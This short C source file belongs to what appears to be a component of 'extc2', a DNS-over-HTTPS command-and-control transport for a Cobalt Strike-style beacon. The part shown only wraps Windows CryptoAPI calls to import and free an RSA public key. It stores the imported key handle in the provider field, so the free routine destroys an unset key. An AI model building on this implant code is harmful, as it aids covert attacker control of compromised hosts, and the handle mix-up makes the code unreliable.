/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "../common.h"

/*-
 *
 * CryptRsaInit
 *
 * Purpose:
 *
 * Creates a key object for RSA
 *
-*/
BOOL CryptRsaInit( PBEACON_INSTANCE Ins )
{
	if ( Ins->api.CryptAcquireContextA( &Ins->key[0].Provider, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
	{
		if ( Ins->api.CryptImportPublicKeyInfo( Ins->key[0].Provider, X509_ASN_ENCODING, Ins->key[0].Ptr, &Ins->key[0].Provider ) )
		{
			return TRUE;
		};
		Ins->api.CryptReleaseContext( Ins->key[0].Provider, 0 );
	};
	return FALSE;
};

/*-
 *
 * CryptRsaFree
 *
 * Purpose:
 *
 * Free's the associated keys for RSA
 *
-*/
VOID CryptRsaFree( PBEACON_INSTANCE Ins )
{
	Ins->api.CryptDestroyKey( Ins->key[0].Key );
	Ins->api.CryptReleaseContext( Ins->key[0].Provider, 0 );
};
